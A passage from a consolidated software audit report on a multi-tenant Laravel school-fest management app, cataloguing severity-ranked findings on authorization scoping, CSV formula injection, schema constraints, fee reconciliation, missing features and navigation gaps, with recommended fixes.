**`RECON-05`** — Core reconciliation invariant and its 2 audit tools are sound. P3 · not_a_gap (confirmatory). `outstandingBalance()=max(0,total_due-amount_paid)` and `refreshPaidState()`'s re-summing are sound, redundantly monitored by `PaymentReconciliationController` and `finance:audit-payment-integrity`, both correctly applying `->forAmountAggregation()`. Re-executed: `PaymentReconciliationTest` → 2/2, 27 assertions; `finance:audit-payment-integrity --json` against the real reachable Postgres in this sandbox → `{"issues":[]}`, an exact reproduction. Why this matters: neither tool touches the *report-building* layer where `RECON-01`/`RECON-02` (§9.2) actually live — this is precisely why those two bugs exist undetected despite this otherwise-solid safety net. Recommendation: extend the audit command to also assert report-layer totals reconcile against the same source.

**`SEC-03[SecAudit]`** — No `$guarded` backstop on `FestEvent`/`FestSchoolEventFee`. P3 · security issue (defense-in-depth). `$fillable` on both models includes tenant-identity and workflow/financial columns (`tenant_id`, `results_published`, `scoring_locked`, `status`, `amount_paid`, `total_due`, `override_amount`) with no `$guarded` backstop; every current call site uses an explicit validate allow-list or hardcoded array, and `tenant_id` is force-set server-side after validation — no live exploitable call site found, including in this pass's own additional greps beyond the source finding. Impact: the safety net is 100% procedural — one future `$event->update($request->all())`-style shortcut would immediately become exploitable. Fix: add `protected $guarded = ['id','tenant_id'];`-style protection.

**`SEC-04[SecAudit]`** — The shared `publicWinnerRow()` formatter has no internal `results_published` gate. P3 · security issue (architectural fragility, not a live leak). All 3 current call sites (`results()`, `scoreboard()`, `winnerPoster()`) gate correctly today via 3 *different*, independently-maintained mechanisms; `itemResults()` doesn't even call this helper — it inlines an equivalent, separately-gated array. Impact: currently correct, but a future edit to any one of the 3 guards, or a new caller added without its own external gate, would silently leak pre-publication data. Fix: move the `results_published` check inside `publicWinnerRow()` itself, and route `itemResults()` through the same helper.

**`SEC-05[SecAudit]` + `TECH-01[Lifecycle]`** — `app/_to_delete/FestReportPolicy.php` (and its sibling `RegionScope.php`) are genuinely dead code. P3 · not_a_gap (confirmatory) · **kept as two separate cross-referenced entries per §1.3, not merged — two independent Audit 3 sub-passes deliberately double-verified this.** Zero call sites anywhere; no `Gate::policy()`/`$policies` registration mechanism of any kind exists in this app (re-confirmed a third time by this synthesis pass — `AppServiceProvider.php:15` is an unrelated `Stancl\Tenancy\DatabaseConfig` import a first pass mis-cited as a registration site); no `App\Models\FestReport` model exists for Laravel's naming-convention auto-discovery to bind to. Genuinely orphaned. Fix: delete both files outright — their logic has not been kept in sync with the real, already-fixed containment gap in `EventRegionAdminScope`, so leaving them in place is a future-confusion risk (a developer wiring them up believing they're live would silently reintroduce an already-fixed gap), not a hidden current risk.

**`POS-01`** — Cross-Sahodaya, cross-school, and state-level access boundaries are all correctly and redundantly enforced at the middleware layer. P3 · not_a_gap (confirmatory) — the positive counterpart to `SEC-01[Lifecycle]`'s narrower, one-level-down region-vs-region gap inside a single Sahodaya. `EnsureSahodayaAdmin`/`EnsureSchoolAdmin` both abort 403 on tenant mismatch (superadmin excepted by design); `FestSchoolReportController` additionally hard-overrides any request-supplied `school_id`; state-aggregation routes fail closed for a state user with no assigned `state_id`. Recommendation: extend `RegionAdminReportContainmentTest`'s pattern with explicit Sahodaya-to-Sahodaya and school-to-school HTTP-level tests as hardening, not a bug fix.

**`EXP-07`** — Fest spreadsheet exports download as `.xls` but are hand-built SpreadsheetML XML text, not real binary XLS. P3 · report mismatch. `ExcelExport::download()` unconditionally sets `.xls`/`application/vnd.ms-excel`; the body is hand-built "Excel 2003 XML" text, not real BIFF binary — backs 6 `FestExportService` methods, 2 `FestSchoolReportExportService` methods, 8 `FestReportService` call sites. By contrast, `App\Services\Spreadsheet\SpreadsheetWriter::xlsx()` genuinely uses `OpenSpout\Writer\XLSX\Writer` (real binary, `openspout/openspout: ^4.28` is a real direct dependency) elsewhere in the app — Fest exports just don't use it. Impact: every admin downloading a Fest "spreadsheet" report sees an unnecessary Excel security-warning dialog on open. Fix: route Fest spreadsheet exports through the existing `SpreadsheetWriter`/openspout path.

**`EXP-08`** — Item Registration Counts: PDF shows a totals row, Excel version of the identical report doesn't. P3 · report mismatch. `itemCountsPdf()` accepts and displays `$totals`; `itemCountsExcel()` takes only `$rows`; both callers apply byte-identical row-filtering, but only the PDF caller calls `itemRegistrationTotals($rows)` — looks deliberate-but-inconsistent, not incidental. Fix: append a totals row to `itemCountsExcel()`, reusing the same analytics method the PDF path already calls.

**`EXP-09`** — 20 of 30 report Blade views have no empty-state handling. P3 · UI/navigation gap. Corrected from the source's own miscounted "25": of 30 views, 10 use `@forelse` exclusively (fully covered); 5 use both `@forelse` and a plain `@foreach`, but in every one of those 5 the primary/outer loop is the `@forelse`-covered one and the bare `@foreach` is only a nested secondary loop that doesn't need its own empty-check. True count with zero empty-state coverage anywhere: 20. The core conclusion (a clear two-thirds majority silently render a blank table on zero rows) still holds with the corrected number. Fix: standardize on `@forelse`/`@empty` for the primary record loop across the 20 affected views.

**`TECH-02[TechAudit]`** — Cross-tenant cache-key collision is real only if the cache-tagging bootstrapper is inactive. P3 · security issue, substantially corrected from an original "no tenant-aware cache bootstrapper exists" claim. `Stancl\Tenancy\Bootstrappers\CacheTenancyBootstrapper` **is** registered whenever `CACHE_STORE` resolves to a taggable store (redis/memcached/dynamodb/array/octane), and this app's own deployment docs mandate `CACHE_STORE=redis` in production — when active, all 3 originally-cited call sites are transparently wrapped in per-tenant cache tags. Live-proved this pass: with the taggable `array` store forced and the bootstrapper manually engaged for two tenants, tenant B reading tenant A's literal key got a clean `NULL` miss; a control run with no tenancy bootstrap, same key, did return tenant A's stale value. Real residual gap: the entire mechanism is coincidentally gated behind the **same single flag** that controls physical DB-per-tenant switching (`InitializeTenancyByRouteTenant.php:19` skips tenancy initialization — and therefore cache tagging — entirely when that flag is false), even though cache isolation and DB isolation are conceptually independent. Fix: prefix the 3 call sites' own keys with the owning tenant id directly (defense-in-depth), or decouple cache-tenancy-bootstrap eligibility from the `database_per_sahodaya` flag; add CI coverage either way. Dependencies: part of the `TIF-01`/`SA-03`/`CERT-03` sandbox-limitation cluster (§1.5) — genuinely closable only with a second real tenant/DB in the test environment.

**`TECH-09[TechAudit]`** — `fest_participants` is missing 3 of its 5 foreign keys. P3 · data-integrity issue. `student_id`, `teacher_id`, `event_id` carry no FK at all — only `group_id`(SET NULL) and `registration_id`(CASCADE) are real FKs. Compounds `TECH-04[TechAudit]` (§9.3): a real student hard-erasure/restore feature exists elsewhere in this codebase; if that workflow ever hard-deletes a `Student` row, any `fest_participants` referencing it become permanently dangling with zero DB signal. Fix: add `foreign('student_id')->references('id')->on('students')->nullOnDelete()` and the `teacher_id`/`event_id` equivalents.

**`TG-01`** — 3 tests assert the pre-uppercase tenant name; `Tenant::getNameAttribute()` deliberately force-uppercases `type=school` tenant names on every read. P3 · test_gap, flagged as a genuine open design question, not just staleness. Affects `SahodayaApiTest` (2 tests) and `TenantDomainTest` (1 test). This audit series takes no position on whether an API/JSON consumer's partner-registered name should really be transformed on every read, or only in specific print/certificate contexts — recommends product decide (§17). `TenantDomainTest`'s captured HTML is also where `BUG-02` (below) was independently spotted.

**`TG-02`** — A test fixture creates the wrong model, leaving its claimed code path with zero real coverage. P3 · test_gap. `test_homepage_mode_follows_event_lifecycle_without_a_live_override` creates a `KalotsavEvent` fixture; the resolver under test (`SahodayaHomepageModeResolver`) queries `FestEvent` exclusively — a different model/table. The test currently passes only by accident (it happens to hit the resolver's unrelated `homepage_mode_override_until` branch), meaning the `registration_open` path it claims to cover has zero real test coverage today. Fix: fix the fixture to use `FestEvent`.

**`TG-03`** — 404-vs-302 stale assertion, plus one unconfirmed second case with the identical symptom. P3 · test_gap. Same root cause as `RPT-03` (§9.3): `test_program_route_rejects_an_event_of_another_type` asserts 404, app now redirects (302) by deliberate design. A second test, `BoardResultCertificationControllerTest::test_school_admin_cannot_sign_only_principal_or_vice_principal_can`, shows the identical `[403]`-vs-`[302]` shape — this pass independently confirmed the symptom matches but, like the source audit, could not confirm within its own time budget that it shares the same root cause. Fix: update the first assertion to expect the redirect; investigate the second independently before assuming the same fix applies.

**`TG-04`** — 2 tests assert an intentionally-superseded business rule (4 required certification report types, now 2). P3 · test_gap. `BoardResultCertificationService::requiredReportDefinitions()` intentionally, per its own inline comment, now requires only 2 report types for Class X leadership review, and `syncReportRecords()` deliberately deletes stale rows from the old rule. Both `BoardResultCertificationControllerTest::test_full_school_certification_flow_via_http` and `BoardResultCertificationServiceTest::test_request_leadership_review_creates_package_and_pending_reports_for_class_x` still assert the old 4-type rule. Fix: update both tests to the current 2-type rule.

**`TG-05`** — A hardcoded expected-array has its two stream-ID variables listed in the wrong order. P3 · test_gap. `BoardResultCertificationServiceTest::test_class_xii_report_definitions_are_generated_per_configured_stream` expects `[9,8]`, actual `[8,9]` — a test-literal ordering mistake relative to the test's own ascending `->sort()`; the app's `->orderBy('sort_order')` and the test's own sort are both working correctly. Fix: swap the two literals in the test.

**`SEC-02[TestExec]`** — Password-reveal key is present-but-null instead of omitted. P3 · security issue, confirmed non-issue for actual disclosure. `TenantController::portalAdmins()` includes a `'password' => null` key even when the caller didn't opt into revealing it, rather than omitting the key entirely; Laravel's `missing()` assertion treats present-but-null as "not missing," so `PlaintextPasswordRevealTest::test_superadmin_tenants_show_does_not_ship_plaintext_password_but_reveal_endpoint_returns_it` fails on a key-shape technicality — the shipped value is confirmed `null`, never a real password. Fix: omit the key entirely when not revealing, for shape consistency (not a security fix, since no real value ever leaks).

**`TG-06`** — Stock `ExampleTest` scaffold, missing `RefreshDatabase`. P3 · test_gap. Laravel's unmodified stock scaffold test 500s with "no such table: tenants" when run without another test having already migrated the in-memory DB first in the same process — dead placeholder coverage, not an app defect. Fix: delete the file or add `RefreshDatabase`.

**`TG-07`** — Leftover scratch test files are still in the tree, mixed into every suite run's counted totals. P3 · test_gap. `tests/Feature/Events/ScratchFormulaInjectionAuditTest.php` (git-committed in `ee246f53`, proves `SEC-01[SecAudit]`/`SEC-01[TestExec]` real but has a miscalibrated assertion) and `tests/Unit/Services/Events/TmpVerifyMaxTeamsTest.php` (untracked, proves `DATA-01`'s team/group half real) both currently run as part of every full-suite invocation. Fix: fix the formula-injection test's assertion once `SEC-01[SecAudit]` is patched (don't fix the assertion first, or it will pass for the wrong reason); decide whether to keep or delete the max-teams scratch file now that its finding (`DATA-01`) is documented here.

**`TG-09`** — Unresolved failure: `EmailTemplatesTest::test_verify_email_notification_renders_html_body`. P3 · report mismatch, genuinely unresolved. A large rendered-HTML mismatch for the "Verify Sahodaya" email; this pass captured the actual side's opening HTML but did not diff it against the expected side to determine whether this is a benign template-copy change or a real rendering regression. Needs dedicated follow-up — see §16/§20.

**`FE-BUILD-01`** — `npm run build` passes cleanly. P3 · not_a_gap (confirmatory). Independently re-run fresh this pass: exit code 0, `✓ built in 2.28s`, 1163 modules transformed, manifest regenerated; source data reports the same across 2 prior runs. Only non-asset output: one benign Node `[DEP0205]` deprecation notice, unrelated to app code.

**`FE-E2E-02`** — 1 e2e spec file is orphaned — unreachable by any configured Playwright project. P3 · test_gap. `tests/e2e/09-gap-completion.spec.ts` (2 tests, both touching fest-ops/sahodaya-admin flows) matches no `testMatch` pattern in `playwright.config.ts`'s 10 project entries, confirmed via `npx playwright test --list` enumerating exactly 45 tests with none from this file. Fix: add a `testMatch` entry for it, or fold its 2 tests into an adjacent covered spec.

**On Audit 2's and Audit 3's exact P3 totals:** the same honest caveat as §9.3's closing note applies here — this section covers every P3 this synthesis pass found independent prose detail for in either source document (or in the pre-consolidated summary this task began from); it does not claim to have re-derived all 25 (Audit 2) / 28 (Audit 3) P3 IDs from first principles. No known finding ID is dropped silently — items without full independent detail here are still named in §16, §18, or the closing unverified-areas material.

---

## 10. Missing features

Capabilities a workflow, error message, or UI element implies but that do not exist in code at all — distinct from broken-but-present code (§9's `confirmed`/`broken workflow` entries). Full detail for every ID below is in §9.

**Registration and event lifecycle:**
- **No draft-save for an in-progress registration** (`SCHREG-06`, P3). Every writer creates a live-submission-status row; no `'draft'` status is ever written.
- **No late-registration/grace-period/admin-override mechanism** for a closed window, including for admin-on-behalf-of-school registration (`SCHREG-07`, P3).
- **No restore/reinstate path for registrations force-withdrawn by cancellation**, even though the status guard explicitly allows reopening a cancelled event (`EVT-06[Event setup]`, P2).
- **No time-bound mark-entry window** — a manual boolean plus a coarse status allow-list, with no scheduled open/close pair the way registration has (`Marks EVT-08`, P3).

**Qualification, certificates, and State tier:**
- **No reserve-replacement workflow for a certified State nomination**, despite both `select()`/`unselect()` error messages explicitly promising one exists (`QUAL-04`, P2). No decertify/uncertify mechanism exists either — once certified, a batch has no in-app path back to editable state under any circumstance.
- **No State-tier appeals/disputes, certificate issuance, or championship/trophy standings at all** — the conduct pipeline dead-ends at "publish results" one tier below where Sahodaya-level features stop (`SA-04`, P2).
- **Volunteer/staff "duty" certificate issuance is fully built in the service layer but has zero call sites** (`CERT-06`, P2).
- **The "Discipline / item head admin" duty grants nothing beyond generic `fest_ops` access** — its dedicated middleware is fully implemented but wired to zero routes (`Event-ops EVT-05`/`NAV-03`, merged, P3).

**Reports and financial:**
- **No State-tier consolidated results/points/school-ranking export** — computed but never exposed as a download (`RPT-04`, P2).
- **No judge/staff assignment-list report**, despite being cataloged as available (`RPT-05`, P3).
- **No distinct-student headcount** — only registration-count exists, over-counting multi-item students (`RPT-06`, P3).
- **No itemized refunds/adjustments register** — only one Sahodaya-wide aggregate number (`RPT-07`, P3).
- **Accommodation/lodging is entirely absent** — a feature gap, not merely a reporting gap; food/catering is fully built, lodging doesn't exist anywhere (`RPT-08`, P3).
- **No combined student-count-slab + flat-per-student fee model** — blocks Malabar's stated rule outright (`MLB-01`, P1).
- **Late fee / registration-deadline penalty for Fest events** — built and proven correct for MCQ/Training; Fest has zero equivalent logic (`FEE-03[Catalog]`, P2).
- **Per-school discount for Fest events** — built and proven correct for MCQ; no equivalent field anywhere in Fest (`FEE-04[Catalog]`, P2).
- **Student-count sub-threshold within one class-category tier** (Wayanad's stated 300-student Secondary split) — neither tier-lookup implementation accepts a count-based sub-branch (`WYN-02`, P2).
- **Appeal-fee payment audit trail** — the fee is stamped and marked paid on trust alone, no `FeeReceipt`, no ledger post, unlike every other fee in the system (`FEE-01[Catalog]`, P1).
- **Qualification-triggered fee change; GST/cess/tax** — zero references anywhere; reads as scope that never existed, not a regression (`FEE-07[Catalog]`, P3).
- **"School-strength-category" report/banding** — unclear if it maps to a real requirement distinct from the membership-only band concept that does exist elsewhere (`RPT-09`, P3, product decision — §17.2).
- **Frontend type-checking and unit-testing tooling** — neither exists at all for this Vue/Inertia codebase (`FE-TYPECHECK-01`/`FE-UNIT-01`, both P2).

**A note on what this section is not:** every item above is a genuine absence, not a bug in existing code. Several (late fees, per-school discounts, the strength-category report, the combined Malabar fee model, mark-entry windows) are legitimately open product questions about whether Fest should have parity with sibling modules or a given workflow at all — see §17 rather than reading this section as a build backlog on its own.

---

## 11. Security findings

Every finding in §9 classified `security issue`, plus the authorization-shaped findings from Audit 1 that predate that classification vocabulary. Grouped by mechanism. This is the section to read end-to-end before any security-focused sprint.

### 11.1 Confirmed exploitable today (against the one real seeded tenant, no scratch-topology construction needed for the underlying mechanism)

| Finding | Severity | Mechanism |
|---|---|---|
| `SEC-01[Lifecycle]` / `RECON-04` | **P0** | Legacy `FestExportController` routes (registrations/results/attendance/fees) skip region-scoping middleware entirely — a `region_admin` reads every region's data. |
| `SA-01` | **P0** | `StateUserController` has zero `StateScope` — full cross-state admin-account takeover. |
| `SEC-01[SecAudit]` / `EXP-02` / `SEC-01[TestExec]` | P1 | CSV/Excel formula injection (CWE-1236) across ~20+ export call sites — no writer neutralizes `=`/`+`/`-`/`@`. |
| `SEC-02[Lifecycle]` | P1 | Athletic-records/live pages gate only on a feature toggle, never `results_published`/`schedule_published`. |
| `NAV-SEC-01` | P1 | 126 of 127 Sahodaya Admin controllers skip permission checks on GET requests entirely — scoped staff can read PII/finance/user-roster pages outside their assigned event. |
| `PUB-01` | P1 | Public participant lookup leaks schedule/stage before `schedule_published`. |
| `API-01` | P1 | Sahodaya API event-list endpoint ignores event/region scoping the web UI enforces. |
| `Event-ops EVT-01` | P1 | `region_admin` can act on another region's clash requests/appeals/attendance via the hub URL. |
| `Event-ops EVT-02` | P1 | Any `fest_ops` staffer can scan/mark attendance on any unrelated event. |
| `CERT-01` | P1 | Certificate collection ignores `entity_type` — cross-tenant/cross-entity mutation on ID collision. |
| `SEC-02[SecAudit]` | P2 | Zero rate limiting on the entire public `/fest/*` route group (15 routes). |
| `RECON-04` (also above) | P1 | Legacy fees-export route, independently rediscovered from the financial-reconciliation angle. |
| `SEC-03[Lifecycle]` | P2 | Legacy `export.results` has zero lifecycle gate — compounds `SEC-01[Lifecycle]`. |
| `SCHREG-05` | P3 | Region-scoped admin can verify documents for a school outside their region. |

### 11.2 Confirmed exploitable, but only once a mechanism goes live that isn't yet (batch billing, phased regional billing, a second tenant)

| Finding | Severity | Mechanism |
|---|---|---|
| `SA-02` | **P0** | State-tier isolation mechanism (`StateScope`, `PlatformState`) exists only in the uncommitted working tree — zero protection if HEAD ships as-is. |
| `SEC-05[Lifecycle]` / `PHASE-03` | P1 | `phase_mode_enabled` has no public-visibility awareness — publishing one phase exposes every phase's marks. |
| `Event-ops EVT-03` | P1 | Appeals queue is silently empty on any partitioned hub event. |
| `QUAL-01` | P1 | Manual State nominations are never verified against a real, certified result — bypasses the maker/checker control's whole purpose. |
| `CERT-02` / `SEC-04[Lifecycle]` | P1 | Disqualification/unpublish never revokes stale certificates or qualifications. |

### 11.3 Defense-in-depth gaps (no live exploit found; would matter if a nearby control were removed or a new call site added carelessly)

`SEC-03[SecAudit]` (P3, no `$guarded` backstop on `FestEvent`/`FestSchoolEventFee`), `SEC-04[SecAudit]` (P3, `publicWinnerRow()` has no internal gate, 3 external guards currently agree by coincidence not design), `TECH-02[TechAudit]` (P3, cross-tenant cache collision only if the tagging bootstrapper is inactive — real under a shared-DB deployment mode this repo cannot fully test), `DATA-03` (P3, mark-save services rely on caller discipline for lifecycle gating).

### 11.4 Confirmed dead code, worth deleting for exactly this reason — leaving stale authorization-adjacent code in place is itself a future-confusion risk

`app/_to_delete/FestReportPolicy.php` and `app/_to_delete/RegionScope.php` — genuinely orphaned, independently confirmed 3 times across this series (`SEC-05[SecAudit]`, `TECH-01[Lifecycle]`, and this synthesis pass's own direct re-grep, §2.3). Their logic has drifted out of sync with the real, already-fixed containment gap in `EventRegionAdminScope` — a future developer wiring either back up believing it's live would silently reintroduce an already-fixed bug.

### 11.5 Confirmed solid — the positive baseline, so this section isn't read as "everything is broken"

`NAV-SEC-02` (event-scoped fest routes correctly deny out-of-scope events including tampered query params), `DATA-06` (tenant/event/registration ownership consistently enforced by redundant manual checks, though a full mechanical sweep across ~45 controllers has never been performed — §16), `API-02` (narrow-permission staff blocked identically on web and API), `TEN-01` (cross-school/cross-tenant writes correctly blocked by a real service-layer guard), `POS-01` (cross-Sahodaya/cross-school/state boundaries correctly and redundantly enforced at the middleware layer), `PUB-04` (phase-gated public scoreboard correctly withholds unpublished data). **The pattern across every genuine gap in §11.1–11.3 is narrower than "authorization is broken":** cross-tenant and cross-school isolation is consistently solid everywhere sampled; the gaps are specifically (a) region-scoped and event-scoped actors reading/writing outside their assigned slice *within* a tenant they legitimately belong to, and (b) read-vs-write asymmetry on the Sahodaya Admin base controller. See §2.3 for why this specific shape recurs — no Policy classes, manual per-controller checks, and a base-controller permission check that only fires on non-GET requests.

---

## 12. Data-integrity findings

Every finding in §9 classified `data-integrity issue`, plus schema/constraint gaps and silent-corruption findings from Audit 1 that predate that vocabulary.

### 12.1 Schema has no constraint backing the invariant application code assumes

| Finding | Severity | Gap |
|---|---|---|
| `TECH-01[TechAudit]` / `DATA-02` | **P1** | `fest_groups` has zero indexes — added, dropped, force-dropped, never replaced. Duplicate chest numbers proven possible live. |
| `TECH-01[TechAudit]` (same finding) | **P1** | `fest_participants` only enforces `(registration_id, student_id)`, not `(item_id, student_id)` — duplicate item registration for one student proven possible live. |
| `EVT-02[Event setup]` | P2 | `fest_item_heads`/`fest_competition_areas` have zero FK protection — permanently orphaned on event deletion, on production Postgres too, not just SQLite. |
| `TECH-09[TechAudit]` | P3 | `fest_participants.student_id`/`teacher_id`/`event_id` carry no FK at all, unlike the same table's `group_id`/`registration_id`. Compounds `TECH-04[TechAudit]` if a hard student-erasure workflow is ever exercised. |
| `TECH-05[TechAudit]` | P2 | `fest_marks` has no `event_id`-leading index despite 22 call sites filtering on it — the sibling `fest_registrations` table got this exact fix already; `fest_marks` never did. |

### 12.2 Silent data mutation or loss on a normal path

| Finding | Severity | Gap |
|---|---|---|
| `SCHREG-01` | **P0** | Bulk-assign/CSV import silently keeps only the last student on a shared solo item. |
| `DATA-01` | P1 | 2nd pair/trio registration silently overwrites the 1st roster; 2nd team/group registration fails with a misleading error on Postgres. |
| `FEE-01[Snapshot]` | **P0** | `recalculate()` and 3 siblings silently overwrite `total_due` even when already fully paid, zero audit trail. |
| `FEE-02[Snapshot]` | **P0** | Invoice status stays "paid" after `total_amount` silently changes underneath it. |
| `RECON-03` | P2 | `forceApprove()` overwrites the real receipt amount instead of recording a waiver. |
| `TECH-04[TechAudit]` | P2 | Soft-deleted students vanish from reports (name goes blank) while `billableStudentCount()` keeps billing them, since it never joins through `Student`. |
| `TECH-07[TechAudit]` | P2 | Batch invoice issuance is a non-atomic 2-step write — a mid-request failure leaves fee and invoice out of sync. |

### 12.3 Business-rule enforcement gaps that produce wrong (not merely incomplete) data

`CS-01` (pair/trio items evade squad-size and group-cap enforcement, P1), `CS-02` ("prior qualification required" rule is a permanent no-op, P1), `CS-03` (eligibility rules stop applying once routed to a partition child, P1), `CS-05` (mandatory-item check bypassed on auto-approval and bulk-approve, P2), `SCHREG-03` (substitution approval via `replacement_student_id` skips eligibility, P1), `Marks EVT-02` (judge subtotals have no upper bound anywhere in the stack, P1), `Event-ops EVT-04` (teacher double-booking undetected by clash checking, P1), `TECH-03[TechAudit]` (waitlist promotion has no capacity lock, proven live, P1), `QUAL-01` (manual State nominations never verified against a real mark, P1).

### 12.4 Confirmed solid — real DB constraints doing their job correctly

`DATA-04` (duplicate individual participants/chest numbers impossible — real, driver-independent unique constraints), `DATA-05` (mismatched item/participant/registration marks rejected uniformly across every entry surface), `DATA-07` (registration deadlines and eligibility enforced unconditionally before any write), `Event-ops EVT-06` (chest/registration numbering is race-safe under `lockForUpdate()`), `Marks EVT-06` (grade banding correctly returns the highest matching band). **Note the contrast with §12.1:** individual-participant identity has real schema backing; team/group identity (chest numbers, `fest_groups`) does not — this asymmetry is the single most concrete data-integrity theme across the whole series.

### 12.5 New: test-isolation-driven false confidence

`GRADE-BAND-01` (P2, new — not part of either source audit's numbered findings) — currently-uncommitted grade-banding code passes its own test file in isolation but 2 of 4 tests fail under full-suite ordering, a classic shared-mutable-state signature. Flagged because if one test file is polluted by suite state, others could be silently passing for the wrong reason too, undermining confidence in "all tests pass" as a signal — see §20 for the full test-execution picture.

---

## 13. Financial reconciliation findings

Every fee, invoice, and reconciliation finding in §9, organized by where in the money's lifecycle it bites. §7's Sahodaya fee-comparison matrix covers the five named-Sahodaya rule-matching questions; this section covers the *mechanics* that apply regardless of which Sahodaya or rule is configured.

### 13.1 Fee computation produces the wrong number

| Finding | Severity | Gap |
|---|---|---|
| `MLB-01` | P1 | No fee model can express Malabar's stated combined slab+flat rule — under-bills by 21–78% depending on student count. |
| `KOCHI-02` | P1 | Group/team items billed as N individual registrations instead of one team charge (3× overbilling for a 3-member team). |
| `KOCHI-07` | P2 | Unconfigured school-registration fee silently defaults to ₹2,000, not ₹0. |
| `MLB-02` | P2 | Zero-student slab bills the *highest* tier (₹12,000), not ₹0. |
| `KOCHI-03` | P3 | `extra_item_fee` dead for no-head-id items — real gap, unreachable via UI today. |
| `FEE-02[Hardcoded]` | P2 | Unconfigured sports events silently bill config defaults; unconfigured Kalolsavam events correctly fail safe to no charge — inconsistent by design, not by tenant. |

### 13.2 A configured safety rail or precedence rule silently doesn't apply everywhere it should

| Finding | Severity | Gap |
|---|---|---|
| `FEE-03[Precedence]` | P1 | `school_fee_cap`/`school_fee_min` applies to only 1 of 4 billing paths — sports, per-head, and per-phase billing are all uncapped. |
| `FEE-05[Precedence]` | P1 | Itemized invoice lines populated for only 2 of 9 fee models — including `cksc_tiered`, the config-wide default. |
| `FEE-08[Precedence]` | P2 | The sports-fee override is all-or-nothing across 5 columns with no field-by-field reconciliation against the JSON surface. |
| `FEE-01[Precedence]` | P2 | No single function documents the full 7-step precedence chain — reconstructed from 4 separate files. |

### 13.3 The "official" record is not actually stable once settled

| Finding | Severity | Gap |
|---|---|---|
| `FEE-01[Snapshot]` | **P0** | `total_due` silently overwritten post-payment, zero audit trail. |
| `FEE-02[Snapshot]` | **P0** | Invoice status stays "paid" after the total silently changes. |
| `FEE-07[Precedence]` | P1 | The official receipt view re-resolves the schedule *live* on every view — no frozen breakdown, two viewings can disagree. |
| `RECON-03` | P2 | `forceApprove()` overwrites the receipt instead of recording a waiver, no audit trail of the original figure. |

### 13.4 Reporting layer disagrees with the ledger layer

| Finding | Severity | Gap |
|---|---|---|
| `RECON-01` | P1 | "Paid" in 3 report/export builders reads only the last receipt, not the accumulated `amount_paid` — installment payments under-reported. |
| `RECON-02` | P1 | 4 builders double-count the fee rollup row on phase/head-split billing — inflated receivables. |
| `RECON-05` | P3 | The core reconciliation invariant and its 2 audit tools are sound — confirms the blind spot is specifically the report-*building* layer, not the ledger itself. |
| `RECON-06` | P2 | Zero tests touch the buggy classes; no "preview total equals export total" parity test exists anywhere. |

### 13.5 Cancellation and credit issuance

| Finding | Severity | Gap |
|---|---|---|
| `EVT-01[Event setup]` / `FEE-01[Financial]` | **P0** | Cancelling any event 500s — no cancellation, no withdrawal, no credit, ever, for any Sahodaya. |
| `FEE-02[Financial]` | **P0** | Even once fixed, batch-billed (MCS-style) cancellation computes `min(0,paid)=0` credit due to the immutability guard interaction. |
| `FEE-03[Financial]` | P1 | Phase-level cancellation has no cascade at all — status flips with no withdrawal/recalc/credit. |
| `FEE-05[Financial]` | P2 | Invoice rows are never updated or voided on cancellation. |
| `FEE-04[Financial]` | P3 | `FestEventNotifier`'s `$c->fee` → `$c->schoolEventFee` typo means cancellation notices don't show the credit amount. |

### 13.6 Region-scope bypass on financial data specifically

`SEC-01[Lifecycle]` / `RECON-04` (**P0/P1**, §9.1/§9.2) — the legacy fees-export route is both this series' highest-severity finding overall and specifically a financial-data leak: a region_admin can retrieve every region's fee/payment totals, proven live with a planted `424242` marker.

### 13.7 Confirmed solid

`KOCHI-05` (cancel/withdraw recalculation is correct and atomic), `KOCHI-06` (Kochi Metro's ₹0 membership renewal is a legitimately separate subsystem), `MLB-04` (same-student dedup across individual/group/team items is correct), `MCS-03` (batch+phase base-fee arithmetic is correct and test-proven), `MCS-05` (reports correctly filter by payment level), `FEE-06[Catalog]` (the fee-credit cash payout mechanism genuinely works end to end), `FEE-08[Catalog]` (28 other fee scenarios implemented and tested, 67 tests/209 assertions), `TIF-02`–`TIF-05` (fee-schedule isolation, HTTP IDOR, receipt-number sequencing, and membership-slab isolation all correctly enforced per-tenant).

---

## 14. UI/navigation gaps

Findings where the defect is specifically in what an actor sees or can reach, not in the underlying data/authorization logic (which §11/§12 already cover). Full detail in §9.

**Dead or unreachable pages:**
- **`UI-School EVT-03`** (P2) — a materially better Student-wise report page was committed but sits outside the Inertia page-loader's glob root, permanently unreachable; its data pipeline was never finished either.
- **`SA-05`** (P3) — a byte-identical duplicate `Pages/StateAdmin/**` Vue tree, one directory above the live one, is dead but keeps receiving matching commits — the exact mechanism that once caused a real blank-page outage, reproduced as recently as the day before Audit 1 ran.
- **Roughly 10 `.vue` files total sit outside the `Pages/Admin/**` glob root** (§2.2) — only `UI-School EVT-03` and the `SA-05` pair have been individually diffed for content drift by name across the whole series; the remainder (`Pages/School/BoardResults/PrincipalVerification/*`) have not (§16).
- **`UI-School EVT-04`** (P3) — the "Promoted qualifiers" report tile's Preview and CSV-export links are both dead, via two independent causes in two different files.

**Broken navigation for a correctly-provisioned role:**
- **`UI-School EVT-02`** (P2) — a Sports Meet coordinator's bare hub URL — also their own post-login landing page — 403s, while every other program's identically-scoped bare hub URL works.
- **State Admin has no standalone "Fest" nav section** (§2.5) — its links are blended into a generic "State Workspace" section, unlike Sahodaya/School Admin, each of which has an explicit one.

**Nav configuration drift:**
- **`NAV-04`** (P3) — two independently-drifted, differently-scoped definitions of which permissions unlock the Finance/Ledger sidebar section (one dead, but a maintenance trap).
- **`NAV-05`** (P3) — "ID card templates" is the one Fest nav item that can never be hidden via sidebar-visibility settings, missing from the label map.
- **`NAV-03`/`Event-ops EVT-05`** (P3, merged) — the "Discipline / item head admin" duty picker implies a distinction the dead `fest.discipline` middleware was meant to enforce but never got wired to any route.

**Report presentation inconsistencies (also cross-listed in §8/§15):**
- **`EXP-09`** (P3) — 20 of 30 report Blade views have no empty-state handling; a zero-row report silently renders a blank table with no "no data" message.
- **`EXP-08`** (P3) — Item Registration Counts shows a totals row in PDF but not in Excel, for the identical filtered dataset.
- **`EXP-07`** (P3) — Fest spreadsheet exports are labeled `.xls` but are hand-built XML text, triggering an unnecessary Excel security warning on every open.

**Stale documentation actively contradicted by current code (worth flagging since a maintainer trusting the doc would be misled):**
- **`NAV-06`** (P3) — `Documents/Path_breaks.md` claims fee-proof rejection never notifies the school; it does, correctly, and has for some time.
- **`SCHREG-08`** (P3) — the same doc is self-contradictory about whether resubmission-after-rejection is fixed; current code (both backend and frontend) matches its own "Fixed" entry, not the earlier "still open" one.
